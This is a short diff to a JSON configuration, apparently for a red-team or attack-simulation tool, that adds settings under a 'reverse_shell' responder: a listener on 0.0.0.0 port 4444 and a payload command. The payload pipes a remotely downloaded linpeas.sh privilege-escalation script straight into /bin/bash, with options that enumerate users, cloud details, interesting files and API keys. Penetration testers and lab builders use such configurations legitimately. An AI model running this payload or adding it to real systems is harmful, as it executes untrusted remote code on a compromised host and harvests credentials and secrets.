@@ -17,7 +17,10 @@
         "attacker": {
           "responder": {
             "reverse_shell": {
-              "enabled": true
+              "enabled": true,
+              "listen_ip": "0.0.0.0",
+              "listen_port": "4444",
+              "payload": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee /tmp/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
             }
           }
         }
